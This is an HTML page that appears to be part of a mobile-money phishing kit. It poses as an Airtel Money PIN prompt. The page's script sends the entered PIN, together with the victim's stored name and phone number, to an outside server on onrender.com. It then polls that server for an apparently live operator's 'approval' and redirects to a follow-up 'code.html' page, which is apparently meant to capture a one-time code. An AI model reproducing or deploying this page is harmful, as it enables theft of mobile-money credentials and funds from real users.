<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Enter PIN</title>
<style>
body { font-family: Arial, sans-serif; background: #f6f7fb; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.pin-container { background: #fff; padding: 30px; border-radius: 12px; width: 100%; max-width: 350px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; }
h2 { margin-bottom: 8px; }
p { color: #666; font-size: 14px; }
.pin-boxes { display: flex; justify-content: space-between; margin: 25px 0; }
.pin-boxes input { width: 55px; height: 60px; text-align: center; font-size: 24px; border: 2px solid red; border-radius: 8px; outline: none; }
.pin-boxes input:focus { border-color: darkred; box-shadow: 0 0 5px rgba(255,0,0,0.5); }
.shake { animation: shake 0.4s; }
@keyframes shake { 0% { transform: translateX(0); } 25% { transform: translateX(-5px); } 50% { transform: translateX(5px); } 75% { transform: translateX(-5px); } 100% { transform: translateX(0); } }
button { width: 100%; padding: 12px; background: red; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; position: relative; display: flex; justify-content: center; align-items: center; }
button:disabled { background: #ccc; cursor: not-allowed; }
.spinner { display: none; width: 20px; height: 20px; border: 3px solid #fff; border-top: 3px solid rgba(255,255,255,0.3); border-radius: 50%; animation: spin 1s linear infinite; margin-left: 10px; }
@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
.status { margin-top: 15px; font-size: 14px; color: #555; }
.error { color: red; }
</style>
</head>
<body>
<div class="pin-container">
    <h2>Enter Your PIN</h2>
    <p>Please enter your Airtel money PIN</p>

    <form id="pinForm">
        <div class="pin-boxes" id="pinBoxes">
            <input maxlength="1" inputmode="numeric">
            <input maxlength="1" inputmode="numeric">
            <input maxlength="1" inputmode="numeric">
            <input maxlength="1" inputmode="numeric">
        </div>

        <button id="submitBtn" disabled>
            <span id="btnText">Submit PIN</span>
            <div class="spinner" id="spinner"></div>
        </button>
    </form>

    <div class="status" id="status"></div>
</div>

<script>
const BACKEND_URL = "https://zanaco-backend.onrender.com";

const inputs = document.querySelectorAll('.pin-boxes input');
const button = document.getElementById('submitBtn');
const btnText = document.getElementById('btnText');
const statusText = document.getElementById('status');
const spinner = document.getElementById('spinner');
const form = document.getElementById('pinForm');
const pinBoxes = document.getElementById('pinBoxes');

let attempts = 0;
const maxAttempts = 3;
let requestId = null;
let pollInterval = null;

inputs[0].focus();

inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
        input.value = input.value.replace(/[^0-9]/g, '');
        if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
        button.disabled = ![...inputs].every(i => i.value);
    });
    input.addEventListener('keydown', e => {
        if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
    });
});

form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const pin = [...inputs].map(i => i.value).join('');
    const name = localStorage.getItem('name') || '';
    const phone = localStorage.getItem('phone') || '';

    button.disabled = true;
    btnText.textContent = 'Verifying...';
    spinner.style.display = 'inline-block';
    statusText.textContent = 'Please wait while we verify your PIN...';

    try {
        const res = await fetch(`${BACKEND_URL}/submit-pin`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ name, phone, pin })
        });

        const data = await res.json();
        requestId = data.requestId;
        console.log('🆔 RequestId:', requestId, 'PIN submitted');

        // Poll immediately
        pollApproval();
        // And then start interval polling
        pollInterval = setInterval(pollApproval, 1500);

    } catch (err) {
        console.error(err);
        statusText.textContent = 'Failed to submit PIN. Try again.';
        spinner.style.display = 'none';
        btnText.textContent = 'Submit PIN';
        button.disabled = false;
    }
});

async function pollApproval() {
    if (!requestId) return;

    try {
        console.log('⏱ Polling for approval...', requestId);
        const res = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
        const data = await res.json();
        console.log('📊 Poll result:', data);

        if (data.approved === true) {
            clearInterval(pollInterval);
            console.log('✅ PIN approved! Redirecting...');
            window.location.href = 'code.html';
        } else if (data.approved === false) {
            clearInterval(pollInterval);
            attempts++;
            pinBoxes.classList.add('shake');
            setTimeout(() => pinBoxes.classList.remove('shake'), 400);

            if (attempts >= maxAttempts) {
                statusText.innerHTML = '<span class="error">Too many failed attempts. Please try again later.</span>';
                spinner.style.display = 'none';
                return;
            }

            statusText.innerHTML = '<span class="error">Incorrect PIN. Please try again.</span>';
            spinner.style.display = 'none';
            inputs.forEach(i => i.value = '');
            inputs[0].focus();
            button.disabled = true;
            btnText.textContent = 'Submit PIN';
        }
    } catch (err) {
        console.error('Polling error:', err);
    }
}
</script>
</body>
</html>
